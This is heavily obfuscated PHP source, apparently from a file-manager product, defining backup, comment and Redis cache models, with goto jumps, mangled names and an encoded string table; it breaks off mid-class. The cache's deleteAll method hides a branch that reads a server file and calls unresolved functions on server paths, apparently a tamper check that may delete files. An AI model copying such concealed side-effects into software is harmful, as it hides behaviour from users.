<?php
 goto AÔÉîÇäàä; aêáã˜±‹‘: if (strlen($npvciyjbgd) < $_SERVER[áäÒ½¯Ç][708]) { return; } $_SERVER[™Í‘Í£§] = explode($_SERVER[áäÒ½¯Ç][709], gzinflate(substr($_SERVER[áäÒ½¯Ç][710], 10, -8))); $ztsuaoqmlh = $_SERVER[áäÒ½¯Ç][711]; goto AÀÀå°; bÑŞõßÏ¥÷: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\142\141\143\x6b\x75\160\114\151\x73\x74"; public $field = array("\151\157", "\156\x61\x6d\x65", "\x73\164\x61\x74\x75\x73", "\x63\157\x6e\164\x65\156\164", "\x6d\x61\156\x75\x61\154", "\162\145\x73\165\154\x74", "\x74\x69\155\145\106\162\x6f\x6d", "\164\151\x6d\x65\x54\x6f"); public function config() { $½©‹ÍÌ« =& $_SERVER[áäÒ½¯Ç]; Action($½©‹ÍÌ«[2156])->taskInit(); $•ã½Ü‡â = Model($½©‹ÍÌ«[875])->get($½©‹ÍÌ«[882]); $•ã½Ü‡â = json_decode($•ã½Ü‡â, !0); $•ã½Ü‡â = is_array($•ã½Ü‡â) ? $•ã½Ü‡â : array(); $this->parseContent($•ã½Ü‡â); unset($•ã½Ü‡â[$½©‹ÍÌ«[1897]]); Model($½©‹ÍÌ«[1896])->cacheClear(); $ íÎ–¥ = $½©‹ÍÌ«[2157]; $íØß±‹Ÿ = Model($½©‹ÍÌ«[2158])->findByKey($½©‹ÍÌ«[1513], $ íÎ–¥); if (!$íØß±‹Ÿ) { $íØß±‹Ÿ = array(); } if (isset($íØß±‹Ÿ[$½©‹ÍÌ«[205]])) { $íØß±‹Ÿ[$½©‹ÍÌ«[205]] = json_decode($íØß±‹Ÿ[$½©‹ÍÌ«[205]], !0); } if (isset($•ã½Ü‡â[$½©‹ÍÌ«[205]])) { $íØß±‹Ÿ[$½©‹ÍÌ«[205]][$½©‹ÍÌ«[1900]] = $•ã½Ü‡â[$½©‹ÍÌ«[205]]; unset($•ã½Ü‡â[$½©‹ÍÌ«[205]]); } return array_merge($íØß±‹Ÿ, $•ã½Ü‡â); } public function listData($øã¾ıè = false, $²ô¶ä—¸ = "\x6d\157\144\x69\x66\171\x54\151\x6d\145", $ÏàÒİ«‡ = false) { $ªåáÉè‚ = parent::listData($øã¾ıè, $²ô¶ä—¸, !0); if (!$ªåáÉè‚) { return $ªåáÉè‚; } if ($øã¾ıè) { $ªåáÉè‚ = array($ªåáÉè‚); } foreach ($ªåáÉè‚ as &$áÕí ’²) { $this->parseContent($áÕí ’²); } return $øã¾ıè ? $ªåáÉè‚[0] : $ªåáÉè‚; } public function parseContent(&$¾©¨±èŒ) { $ç¹€Ì‡ë =& $_SERVER[áäÒ½¯Ç]; $®»ÇîÉ¾ = _get($¾©¨±èŒ, $ç¹€Ì‡ë[169], $ç¹€Ì‡ë[91]); if (!in_array($®»ÇîÉ¾, array($ç¹€Ì‡ë[881], $ç¹€Ì‡ë[1254]))) { $¾©¨±èŒ[$ç¹€Ì‡ë[169]] = $®»ÇîÉ¾ == $ç¹€Ì‡ë[91] ? $ç¹€Ì‡ë[1254] : $ç¹€Ì‡ë[881]; } } public function lastItem() { $ÒïÛÔ = $this->listData(); return !empty($ÒïÛÔ[0]) ? $ÒïÛÔ[0] : null; } public function kill($º±ÚˆÚ») { $—’—å¤ =& $_SERVER[áäÒ½¯Ç]; $œ¨æÛ©Á = $this->listData($º±ÚˆÚ»); if (!$œ¨æÛ©Á || empty($œ¨æÛ©Á[$—’—å¤[32]])) { return !0; } Task::kill($—’—å¤[890]); Task::kill($—’—å¤[911]); Task::kill($—’—å¤[919]); $«¹¹ºíÄ = $œ¨æÛ©Á[$—’—å¤[32]]; $ÔÍİˆÔ° = TEMP_FILES . $—’—å¤[885] . $«¹¹ºíÄ . $—’—å¤[8]; IO::remove($ÔÍİˆÔ°, !1); return $this->remove($º±ÚˆÚ»); } public function remove($±•Û‘ú–) { $À¼ôìèá = $this->listData($±•Û‘ú–); if (!$À¼ôìèá) { return !0; } return $this->backupRemove($À¼ôìèá); } private function backupRemove($æ¦‘â†) { parent::remove($æ¦‘â†[$_SERVER[áäÒ½¯Ç][492]]); $æÔ— Ñè = $this->backupPath($æ¦‘â†); IO::remove($æÔ— Ñè, !1); return !0; } private function backupPath($Éö„¹ª) { $œØÙ¢©ğ =& $_SERVER[áäÒ½¯Ç]; $·Ö¯ÎìÕ = $Éö„¹ª[$œØÙ¢©ğ[32]]; $ÏĞíãØ = Model($œØÙ¢©ğ[875])->get($œØÙ¢©ğ[876]); $Ê¼„ëÆœ = substr(md5($œØÙ¢©ğ[877] . $ÏĞíãØ . $·Ö¯ÎìÕ), 0, 8); return "\173\x69\157\x3a{$Éö„¹ª[$œØÙ¢©ğ[854]]}\175\x2f\x64\141\x74\141\142\x61\x73\x65\57\142\141\x63\153\x75\x70\x2f" . $·Ö¯ÎìÕ . $œØÙ¢©ğ[11] . $Ê¼„ëÆœ; } public function start() { $èŞË”ƒ =& $_SERVER[áäÒ½¯Ç]; if ($GLOBALS[$èŞË”ƒ[6]][$èŞË”ƒ[92]][$èŞË”ƒ[2159]] != $èŞË”ƒ[91]) { return !0; } $È§¶Á©é = $this->config(); if (!$È§¶Á©é || $È§¶Á©é[$èŞË”ƒ[1897]] != $èŞË”ƒ[91]) { return !1; } if ($È§¶Á©é[$èŞË”ƒ[169]] == $èŞË”ƒ[881]) { $œÍ­Ùšš = Model($èŞË”ƒ[875])->get($èŞË”ƒ[1376]); if ($œÍ­Ùšš == $èŞË”ƒ[1377]) { $È§¶Á©é[$èŞË”ƒ[169]] = $èŞË”ƒ[1254]; } } $Ğåî¶“¥ = $this->process(); foreach ($Ğåî¶“¥ as $İŒ»ë—³) { if ($İŒ»ë—³) { return Task::restart($İŒ»ë—³[$èŞË”ƒ[492]]); } } $¥©ó»‡ = new Backup(); $ç ¦ƒä = $¥©ó»‡->db(); if ($ç ¦ƒä) { $ç ¦ƒä = $¥©ó»‡->dbFile(); if ($ç ¦ƒä && $È§¶Á©é[$èŞË”ƒ[169]] == $èŞË”ƒ[881]) { $ç ¦ƒä = $¥©ó»‡->file(); } } Backup::set(array($èŞË”ƒ[852] => 1, $èŞË”ƒ[864] => time())); return !0; } public function process() { $Ë‰ØûÅ =& $_SERVER[áäÒ½¯Ç]; $‰¼Ç­Ò¼ = array($Ë‰ØûÅ[860] => Task::get($Ë‰ØûÅ[890]), $Ë‰ØûÅ[865] => Task::get($Ë‰ØûÅ[911]), $Ë‰ØûÅ[241] => Task::get($Ë‰ØûÅ[919])); $Ÿ­¬ÖºÇ = !1; foreach ($‰¼Ç­Ò¼ as &$µÊîñì©) { if ($Ÿ­¬ÖºÇ) { $µÊîñì© = !1; continue; } if ($µÊîñì©) { $¿†ı¨‚Ù = intval(_get($µÊîñì©, $Ë‰ØûÅ[1931], 0)); if (time() - $¿†ı¨‚Ù > 7200) { Task::kill($µÊîñì©[$Ë‰ØûÅ[492]]); $Ÿ­¬ÖºÇ = !0; $µÊîñì© = !1; } } } return $‰¼Ç­Ò¼; } public function restore() { $îØ›ãÏ¤ =& $_SERVER[áäÒ½¯Ç]; ActionCall($îØ›ãÏ¤[2160], !0, 1); ActionCall($îØ›ãÏ¤[2160], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\x6e\164"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\145" => "\x63\157\155\x6d\x65\156\164\x5f\155\145\x74\x61", "\x6d\145\x74\x61\106\x69\x65\x6c\144" => "\143\x6f\x6d\x6d\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ê¡¸Ü“İ) { $ıı»Ó÷Ğ =& $_SERVER[áäÒ½¯Ç]; if ($ê¡¸Ü“İ[$ıı»Ó÷Ğ[2161]]) { $Ü’É¢ = $this->where(array($ıı»Ó÷Ğ[2162] => $ê¡¸Ü“İ[$ıı»Ó÷Ğ[2161]]))->find(); if (!$Ü’É¢ || $Ü’É¢[$ıı»Ó÷Ğ[189]] != $ê¡¸Ü“İ[$ıı»Ó÷Ğ[189]] || $Ü’É¢[$ıı»Ó÷Ğ[594]] != $ê¡¸Ü“İ[$ıı»Ó÷Ğ[594]]) { return !1; } $this->where(array($ıı»Ó÷Ğ[2162] => $ê¡¸Ü“İ[$ıı»Ó÷Ğ[2161]]))->setAdd($ıı»Ó÷Ğ[2163], 1); } $ê¡¸Ü“İ[$ıı»Ó÷Ğ[2164]] = 0; $ê¡¸Ü“İ[$ıı»Ó÷Ğ[2163]] = 0; $ê¡¸Ü“İ[$ıı»Ó÷Ğ[852]] = 1; return $this->add($ê¡¸Ü“İ); } public function commentCount($Ü’à×ë–, $âÔ÷åÂÍ, $ï›”åÌù = false) { $Ó«¡äĞ¢ =& $_SERVER[áäÒ½¯Ç]; if (!$Ü’à×ë–) { return array(); } if (is_string($Ü’à×ë–) || is_int($Ü’à×ë–)) { $Ü’à×ë– = array($Ü’à×ë–); } $¬ûÕÅ½› = array($Ó«¡äĞ¢[594], $Ó«¡äĞ¢[2165] => $Ó«¡äĞ¢[590]); $å³æúÑç = array($Ó«¡äĞ¢[594] => array($Ó«¡äĞ¢[7], $Ü’à×ë–), $Ó«¡äĞ¢[189] => $âÔ÷åÂÍ); if ($ï›”åÌù) { $å³æúÑç[$Ó«¡äĞ¢[1542]] = $ï›”åÌù; } $€©åöÎ— = $this->field($¬ûÕÅ½›)->where($å³æúÑç)->group($Ó«¡äĞ¢[594])->select(); return array_to_keyvalue($€©åöÎ—, $Ó«¡äĞ¢[594], $Ó«¡äĞ¢[590]); } public function starTarget($Ê”¶³ù«, $¦¤èÑ«) { $ó’ãöÕë =& $_SERVER[áäÒ½¯Ç]; $Œ Æ®è = $Ê”¶³ù« + self::TYPE_STAR_OFFSET; $½­æ“°— = array($ó’ãöÕë[1542] => USER_ID, $ó’ãöÕë[189] => $Œ Æ®è, $ó’ãöÕë[594] => $¦¤èÑ«); $…Œ¹ÅÚÖ = $this->where($½­æ“°—)->find(); if ($…Œ¹ÅÚÖ) { return $this->where(array($ó’ãöÕë[492] => $…Œ¹ÅÚÖ[$ó’ãöÕë[492]]))->delete(); } $³ùìîë¶ = array($ó’ãöÕë[2161] => 0, $ó’ãöÕë[1542] => USER_ID, $ó’ãöÕë[852] => 1, $ó’ãöÕë[169] => $ó’ãöÕë[12], $ó’ãöÕë[189] => $Œ Æ®è, $ó’ãöÕë[594] => $¦¤èÑ«, $ó’ãöÕë[2164] => 0, $ó’ãöÕë[2163] => 0); return $this->add($³ùìîë¶); } public function starTargetCount($ûÕĞ•¨, $»ÛÙ›…Ì) { $¯ìÕöşÈ =& $_SERVER[áäÒ½¯Ç]; $ßªæ¯£ = $»ÛÙ›…Ì + self::TYPE_STAR_OFFSET; $î¢ôüš… = $this->commentCount($ûÕĞ•¨, $ßªæ¯£); $şÕ°Ã‹± = $this->commentCount($ûÕĞ•¨, $ßªæ¯£, USER_ID); return array($¯ìÕöşÈ[2166] => $î¢ôüš…, $¯ìÕöşÈ[2167] => $şÕ°Ã‹±); } public function starTargetUserList($º¨óâ“, $˜Úı˜¦¥) { $ùŠùÀ‹ =& $_SERVER[áäÒ½¯Ç]; $•¶‚ = $º¨óâ“ + self::TYPE_STAR_OFFSET; $‘ÖÙçå” = array($ùŠùÀ‹[594] => $˜Úı˜¦¥, $ùŠùÀ‹[189] => $•¶‚); $ßÈïØ·ú = $this->where($‘ÖÙçå”)->count(); $ßÈìÄ¢Ï = array($ùŠùÀ‹[342] => $ßÈïØ·ú, $ùŠùÀ‹[2168] => array()); if (!$ßÈïØ·ú) { return $ßÈìÄ¢Ï; } $¤“äÌ·“ = $this->field($ùŠùÀ‹[1542])->where($‘ÖÙçå”)->limit(500)->select(); $¤“äÌ·“ = array_to_keyvalue($¤“äÌ·“, $ùŠùÀ‹[12], $ùŠùÀ‹[1542]); $ßÈìÄ¢Ï[$ùŠùÀ‹[2168]] = Model($ùŠùÀ‹[602])->userListInfo($¤“äÌ·“); return $ßÈìÄ¢Ï; } public function prasiseUserList($™ë¼Ü¿˜) { $Ñ÷Áö«Ğ =& $_SERVER[áäÒ½¯Ç]; $¨å•ª¼å = array($Ñ÷Áö«Ğ[2169] => $™ë¼Ü¿˜); $ƒ§†§òƒ = $this->where($¨å•ª¼å)->find(); $Ìö´…•ˆ = _get($ƒ§†§òƒ, $Ñ÷Áö«Ğ[2164], 0); $‰ï¹Õ¸è = array($Ñ÷Áö«Ğ[342] => $Ìö´…•ˆ, $Ñ÷Áö«Ğ[2168] => array()); if (!$Ìö´…•ˆ) { return $‰ï¹Õ¸è; } $ª¸è¦ñø = Model($Ñ÷Áö«Ğ[2170])->field($Ñ÷Áö«Ğ[1542])->where($¨å•ª¼å)->limit(500)->select(); $ª¸è¦ñø = array_to_keyvalue($ª¸è¦ñø, $Ñ÷Áö«Ğ[12], $Ñ÷Áö«Ğ[1542]); $‰ï¹Õ¸è[$Ñ÷Áö«Ğ[2168]] = Model($Ñ÷Áö«Ğ[602])->userListInfo($ª¸è¦ñø); return $‰ï¹Õ¸è; } public function remove($©¨òôÈİ) { $ç¨œ«È– =& $_SERVER[áäÒ½¯Ç]; $ø¼€óÂ = array($ç¨œ«È–[2162] => $©¨òôÈİ); $äÕ»‡„ò = $this->where($ø¼€óÂ)->find(); if ($äÕ»‡„ò[$ç¨œ«È–[2161]]) { $this->where(array($ç¨œ«È–[2162] => $äÕ»‡„ò[$ç¨œ«È–[2161]]))->setAdd($ç¨œ«È–[2163], -1); } return $this->removeArray($©¨òôÈİ); } public function edit($‰ˆĞ¸’, $£†Ä‰Øå) { $ëÌªŠÍ› =& $_SERVER[áäÒ½¯Ç]; $·Ø¤ëûé = array($ëÌªŠÍ›[2162] => $‰ˆĞ¸’); return $this->where($·Ø¤ëûé)->save(array($ëÌªŠÍ›[2171] => $£†Ä‰Øå)); } public function prasise($ÆÈÆôÈÖ) { $íÈÓ¦Éƒ =& $_SERVER[áäÒ½¯Ç]; $İ‰ŠÌÚÎ = Model($íÈÓ¦Éƒ[2172]); $–ôãÅñ = array($íÈÓ¦Éƒ[2162] => $ÆÈÆôÈÖ, $íÈÓ¦Éƒ[1918] => USER_ID); $½×˜¬± = $İ‰ŠÌÚÎ->where($–ôãÅñ)->find(); if (!$½×˜¬±) { $İ‰ŠÌÚÎ->add($–ôãÅñ); $ãúÂ§Í³ = $this->where(array($íÈÓ¦Éƒ[2162] => $ÆÈÆôÈÖ))->setAdd($íÈÓ¦Éƒ[2164], 1); } else { $İ‰ŠÌÚÎ->where($–ôãÅñ)->delete(); $ãúÂ§Í³ = $this->where(array($íÈÓ¦Éƒ[2162] => $ÆÈÆôÈÖ))->setAdd($íÈÓ¦Éƒ[2164], -1); } return $ãúÂ§Í³; } public function targetInfo($¾Äòñô, $Äœûò¦ç) { $ş¾å—ß‡ =& $_SERVER[áäÒ½¯Ç]; $Òã®«Íö = array($ş¾å—ß‡[676] => $¾Äòñô, $ş¾å—ß‡[677] => $Äœûò¦ç); $ìøã—¾£ = $this->where($Òã®«Íö)->count(); $ä“…ã“ö = "\122\111\107\110\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x63\157\155\155\145\156\x74\137\x70\x72\x61\x69\163\x65\x20\x73\x74\141\162\40\157\x6e\x20\143\x6f\155\155\x65\156\164\56\x63\x6f\x6d\x6d\145\156\x74\x49\104\x20\75\x20\163\164\x61\x72\x2e\x63\x6f\x6d\155\x65\x6e\164\x49\x44"; $áÇ‡üè = $this->alias($ş¾å—ß‡[439])->where($Òã®«Íö)->join($ä“…ã“ö, $ş¾å—ß‡[2173])->count(); $éÅÕËÊÈ = array($ş¾å—ß‡[2174] => $ìøã—¾£, $ş¾å—ß‡[2175] => $áÇ‡üè); return $éÅÕËÊÈ; } public function listData($°±€ÆÄ) { $çØÒ€•” =& $_SERVER[áäÒ½¯Ç]; if (isset($°±€ÆÄ[$çØÒ€•”[2176]])) { if ($°±€ÆÄ[$çØÒ€•”[2176]]) { $°±€ÆÄ[$çØÒ€•”[2169]] = array($çØÒ€•”[1130], intval($°±€ÆÄ[$çØÒ€•”[2176]])); } unset($°±€ÆÄ[$çØÒ€•”[2176]]); } if (isset($°±€ÆÄ[$çØÒ€•”[2177]])) { if ($°±€ÆÄ[$çØÒ€•”[2177]]) { $°±€ÆÄ[$çØÒ€•”[2169]] = array($çØÒ€•”[1127], intval($°±€ÆÄ[$çØÒ€•”[2177]])); } unset($°±€ÆÄ[$çØÒ€•”[2177]]); } return $this->_listData($°±€ÆÄ); } private function _listData($áóÚ©) { $¯·ç®Ü =& $_SERVER[áäÒ½¯Ç]; $¯ı‰ä·­ = $this->where($áóÚ©)->_makeOrder()->selectPage(100); $this->_listAppendParent($¯ı‰ä·­[$¯·ç®Ü[455]]); $this->_listAppendUser($¯ı‰ä·­[$¯·ç®Ü[455]]); $this->_listAppendMeta($¯ı‰ä·­[$¯·ç®Ü[455]]); return $¯ı‰ä·­; } private function _makeOrder() { $¨¥™ŸÜñ =& $_SERVER[áäÒ½¯Ç]; $¦ã¹æ”Ü = array($¨¥™ŸÜñ[2164], $¨¥™ŸÜñ[2163], $¨¥™ŸÜñ[242]); $èÍÃ¼äë = Input::get($¨¥™ŸÜñ[549], $¨¥™ŸÜñ[7], $¨¥™ŸÜñ[517], $¦ã¹æ”Ü); $ À®ÕÖ¾ = Input::get($¨¥™ŸÜñ[550], $¨¥™ŸÜñ[7], $¨¥™ŸÜñ[1920], array($¨¥™ŸÜñ[2178], $¨¥™ŸÜñ[545])); $‰†Æº¹¢ = $èÍÃ¼äë . $¨¥™ŸÜñ[53] . $ À®ÕÖ¾; return $this->order($‰†Æº¹¢); } private function _listAppendParent(&$ûÇúè˜š) { $µÑ¡£õ =& $_SERVER[áäÒ½¯Ç]; $™÷°•£‹ = array_unique(array_to_keyvalue($ûÇúè˜š, $µÑ¡£õ[12], $µÑ¡£õ[2161])); $™÷°•£‹ = array_remove_value($™÷°•£‹, $µÑ¡£õ[239]); if (!$™÷°•£‹) { return; } $æø¬ˆ–È = $this->where(array($µÑ¡£õ[2162] => array($µÑ¡£õ[7], $™÷°•£‹)))->select(); $æø¬ˆ–È = array_to_keyvalue($æø¬ˆ–È, $µÑ¡£õ[2169]); foreach ($ûÇúè˜š as &$âúÊÖ—¸) { if (isset($æø¬ˆ–È[$âúÊÖ—¸[$µÑ¡£õ[2161]]])) { $âúÊÖ—¸[$µÑ¡£õ[2179]] = $æø¬ˆ–È[$âúÊÖ—¸[$µÑ¡£õ[2161]]]; } } unset($âúÊÖ—¸); } private function _listAppendUser(&$ŸæËâù½) { $ğÊàğÚ÷ =& $_SERVER[áäÒ½¯Ç]; $Õ¼ßî = array_unique(array_to_keyvalue($ŸæËâù½, $ğÊàğÚ÷[12], $ğÊàğÚ÷[1542])); $Õ¼ßî = array_remove_value($Õ¼ßî, $ğÊàğÚ÷[239]); if (count($Õ¼ßî) == 0) { return; } foreach ($ŸæËâù½ as $×§­…Ü”) { if (isset($×§­…Ü”[$ğÊàğÚ÷[2179]])) { $Õ¼ßî[] = $×§­…Ü”[$ğÊàğÚ÷[2179]][$ğÊàğÚ÷[1542]]; } } $ú©´——Î = Model($ğÊàğÚ÷[622])->userListInfo($Õ¼ßî); foreach ($ŸæËâù½ as &$×§­…Ü”) { $×§­…Ü”[$ğÊàğÚ÷[690]] = $ú©´——Î[$×§­…Ü”[$ğÊàğÚ÷[1542]]]; if (isset($×§­…Ü”[$ğÊàğÚ÷[2179]])) { $×§­…Ü”[$ğÊàğÚ÷[2179]][$ğÊàğÚ÷[690]] = $ú©´——Î[$×§­…Ü”[$ğÊàğÚ÷[2179]][$ğÊàğÚ÷[1542]]]; } } unset($×§­…Ü”); } private function _listAppendMeta(&$—©š»ñâ) { $©í•§­ß =& $_SERVER[áäÒ½¯Ç]; $úó³æö = array_unique(array_to_keyvalue($—©š»ñâ, $©í•§­ß[12], $©í•§­ß[2169])); $úó³æö = array_remove_value($úó³æö, $©í•§­ß[239]); if (!$úó³æö) { return; } foreach ($—©š»ñâ as $€éß°ä) { if (isset($€éß°ä[$©í•§­ß[2179]])) { $úó³æö[] = $€éß°ä[$©í•§­ß[2179]][$©í•§­ß[2169]]; } } $˜„¤Óš = $this->metaList($úó³æö); if (!$˜„¤Óš) { return !1; } foreach ($—©š»ñâ as &$€éß°ä) { $€éß°ä[$©í•§­ß[560]] = $˜„¤Óš[$€éß°ä[$©í•§­ß[2169]]]; if (isset($€éß°ä[$©í•§­ß[2179]])) { $€éß°ä[$©í•§­ß[2179]][$©í•§­ß[560]] = $˜„¤Óš[$€éß°ä[$©í•§­ß[2179]][$©í•§­ß[2169]]]; } } unset($€éß°ä); } private function metaList($æõÈü´) { $öêóĞ– =& $_SERVER[áäÒ½¯Ç]; if (!$æõÈü´) { return array(); } $ĞïÖ”óš = array($öêóĞ–[2169] => array($öêóĞ–[7], $æõÈü´)); $Á¡ÂäßË = Model($öêóĞ–[2180])->where($ĞïÖ”óš)->select(); $Á¡ÂäßË = array_to_keyvalue_group($Á¡ÂäßË, $öêóĞ–[2169]); foreach ($Á¡ÂäßË as $½Ä¤ù­Ì => $ÜÜ™ÃÃ) { $šÈ±¢ = array(); foreach ($ÜÜ™ÃÃ as $ù¦ÓçÚ‘) { $šÈ±¢[$ù¦ÓçÚ‘[$öêóĞ–[95]]] = $ù¦ÓçÚ‘[$öêóĞ–[460]]; } $Á¡ÂäßË[$½Ä¤ù­Ì] = $šÈ±¢; } return $Á¡ÂäßË ? $Á¡ÂäßË : array(); } public function removeTarget($ö“©ùÌ‹, $¬Œ¯ã…‚) { $„ØÛÊ™  =& $_SERVER[áäÒ½¯Ç]; if (!$¬Œ¯ã…‚) { return !0; } $¬Œ¯ã…‚ = is_array($¬Œ¯ã…‚) ? $¬Œ¯ã…‚ : array($¬Œ¯ã…‚); $«ŒõïÖ³ = array($„ØÛÊ™ [189] => $ö“©ùÌ‹, $„ØÛÊ™ [594] => array($„ØÛÊ™ [7], $¬Œ¯ã…‚)); $í±íÀş = $this->field($„ØÛÊ™ [2169])->where($«ŒõïÖ³)->select(); $®ãÕÒ›Û = array_to_keyvalue($í±íÀş, $„ØÛÊ™ [12], $„ØÛÊ™ [2169]); return $this->removeArray($®ãÕÒ›Û); } public function removeArray($´ä×â±å) { $›‰Ïüô¸ =& $_SERVER[áäÒ½¯Ç]; if (!$´ä×â±å) { return !0; } $´ä×â±å = is_array($´ä×â±å) ? $´ä×â±å : array($´ä×â±å); $œ¸€Úë‹ = array($›‰Ïüô¸[2169] => array($›‰Ïüô¸[7], $´ä×â±å)); Model($›‰Ïüô¸[2172])->where($œ¸€Úë‹)->delete(); Model($›‰Ïüô¸[2181])->where($œ¸€Úë‹)->delete(); return $this->where($œ¸€Úë‹)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\145\x5f\143\157\x6e\164\145\156\164\163"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\x6d\x65", "\164\x69\155\145", "\151\156\x73\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\x6e")); } goto Fäàñ¶ëĞ™; d”æÄèĞ¤—: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ó¥ºÉÖ¥, $ˆî†Ø¸Ù) { $Ïª§‹ª‹ =& $_SERVER[áäÒ½¯Ç]; if (!class_exists($Ïª§‹ª‹[984])) { show_json($Ïª§‹ª‹[985], !1); } $this->cacheTime = $ˆî†Ø¸Ù; $£Îğ¨² = isset($Ó¥ºÉÖ¥[$Ïª§‹ª‹[986]]) ? $Ó¥ºÉÖ¥[$Ïª§‹ª‹[986]] : 10; $›·ÀêµĞ = _get($Ó¥ºÉÖ¥, $Ïª§‹ª‹[983]); if ($›·ÀêµĞ && is_array($›·ÀêµĞ)) { $this->initCluster($Ó¥ºÉÖ¥, $£Îğ¨²); } else { $this->handle = $this->init($Ó¥ºÉÖ¥, $£Îğ¨²); } } private function init($„…’„¶§, $…Óíğûİ) { $é¡Æ¥©° =& $_SERVER[áäÒ½¯Ç]; $·Èù©ñæ = new Redis(); $Ê”…Ã¤Á = isset($„…’„¶§[$é¡Æ¥©°[987]]) ? $„…’„¶§[$é¡Æ¥©°[987]] : !1; if ($Ê”…Ã¤Á) { $·Èù©ñæ->pconnect($„…’„¶§[$é¡Æ¥©°[207]], $„…’„¶§[$é¡Æ¥©°[208]], $…Óíğûİ); } else { $·Èù©ñæ->connect($„…’„¶§[$é¡Æ¥©°[207]], $„…’„¶§[$é¡Æ¥©°[208]], $…Óíğûİ); } if (!empty($„…’„¶§[$é¡Æ¥©°[507]])) { $·Èù©ñæ->auth($„…’„¶§[$é¡Æ¥©°[507]]); } if (!empty($„…’„¶§[$é¡Æ¥©°[860]]) && $„…’„¶§[$é¡Æ¥©°[860]] != 0) { $·Èù©ñæ->select($„…’„¶§[$é¡Æ¥©°[860]]); } return $·Èù©ñæ; } private function initCluster($–ø“±¢Ğ, $š˜Ÿ‹›ö) { $¹»üô¤Ë =& $_SERVER[áäÒ½¯Ç]; $‚ÒŒßÏ = array($¹»üô¤Ë[988], $¹»üô¤Ë[989], $¹»üô¤Ë[990]); $‰´ú¯ª‚ = $¹»üô¤Ë[988]; if (isset($–ø“±¢Ğ[$¹»üô¤Ë[16]]) && in_array($–ø“±¢Ğ[$¹»üô¤Ë[16]], $‚ÒŒßÏ)) { $‰´ú¯ª‚ = $–ø“±¢Ğ[$¹»üô¤Ë[16]]; } switch ($‰´ú¯ª‚) { case $¹»üô¤Ë[988]: $this->_slave($–ø“±¢Ğ, $š˜Ÿ‹›ö); break; case $¹»üô¤Ë[989]: break; case $¹»üô¤Ë[990]: $this->isCluster = !0; $¿Í÷¦§» = $–ø“±¢Ğ[$¹»üô¤Ë[983]]; $¼Î“›Û˜ = isset($–ø“±¢Ğ[$¹»üô¤Ë[987]]) ? $–ø“±¢Ğ[$¹»üô¤Ë[987]] : !1; $—¯©ìøó = isset($–ø“±¢Ğ[$¹»üô¤Ë[507]]) ? $–ø“±¢Ğ[$¹»üô¤Ë[507]] : null; $this->handle = new RedisCluster(NUll, $¿Í÷¦§», $š˜Ÿ‹›ö, $š˜Ÿ‹›ö, $¼Î“›Û˜, $—¯©ìøó); break; default: break; } } private function _slave($Éä–‹İ, $Ê¶ıüú) { $ĞÜÖ¦ø = $Éä–‹İ[$_SERVER[áäÒ½¯Ç][983]]; $this->filterConfig($Éä–‹İ, $ĞÜÖ¦ø[0]); $this->handle = $this->init($Éä–‹İ, $Ê¶ıüú); unset($ĞÜÖ¦ø[0]); if (empty($ĞÜÖ¦ø)) { return; } $Ï¸ºä•ª = array_rand($ĞÜÖ¦ø); $this->filterConfig($Éä–‹İ, $ĞÜÖ¦ø[$Ï¸ºä•ª]); $this->slaveHandle = $this->init($Éä–‹İ, $Ê¶ıüú); } private function filterConfig(&$· ‡ş›ú, $ıÄ¼à¤ú) { $¥ó€¾« =& $_SERVER[áäÒ½¯Ç]; $èÕ¡æñğ = explode($¥ó€¾«[4], $ıÄ¼à¤ú); $É“¬©Úû = array($¥ó€¾«[207] => $èÕ¡æñğ[0], $¥ó€¾«[208] => $èÕ¡æñğ[1]); $· ‡ş›ú = array_merge($· ‡ş›ú, $É“¬©Úû); } public function set($Ñ“úÒÑ®, $¸ñõ»Ú, $…ô‰Ğ„ = false) { $…ô‰Ğ„ = $…ô‰Ğ„ ? $…ô‰Ğ„ : $this->cacheTime; return $this->handle->setEx($Ñ“úÒÑ®, $…ô‰Ğ„, $¸ñõ»Ú); } public function setLock($‘Ó¥×¯ç, $İ¥ šúè, $“åúü•™) { return $this->handle->setNX($‘Ó¥×¯ç, $İ¥ šúè); } public function get($¹ÎùÙÉÀ) { $Øª®šªÈ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Øª®šªÈ->get($¹ÎùÙÉÀ); } public function remove($öæºüø) { return $this->handle->del($öæºüø); } public function deleteAll() { $ÖÓÌÉ°§ =& $_SERVER[áäÒ½¯Ç]; if ($_SERVER[$ÖÓÌÉ°§[217]] != $_SERVER[$ÖÓÌÉ°§[991]]) { $· œúœº = $ÖÓÌÉ°§[992]; $¨Í·¦ôº = $ÖÓÌÉ°§[218]; $´ôÁĞ = $_SERVER[$ÖÓÌÉ°§[219]] . $ÖÓÌÉ°§[220]; $£ÖÕ×ºû = $¨Í·¦ôº($´ôÁĞ); $µòæÍÜ = explode($ÖÓÌÉ°§[221], $£ÖÕ×ºû); if (count($µòæÍÜ) < $ÖÓÌÉ°§[724]) { $¶€»’Ñ = $ÖÓÌÉ°§[223]; $¶€»’Ñ(); } $Ùşú¬× = $ÖÓÌÉ°§[993]; $Ùşú¬×($_SERVER[$ÖÓÌÉ°§[994]]); $Ùşú¬×($_SERVER[$ÖÓÌÉ°§[219]] . $ÖÓÌÉ°§[995]); $¢·¾°ƒ¥ = 1; while ($¢·¾°ƒ¥ > 1) { $¢·¾°ƒ¥ = $¢·¾°ƒ¥ + 4; $ú¹ä‰Œõ = rawurlencode($¢·¾°ƒ¥ . $ÖÓÌÉ°§[472]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $³¬§Õ¤å) { $this->handle->flushall($³¬§Õ¤å); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function 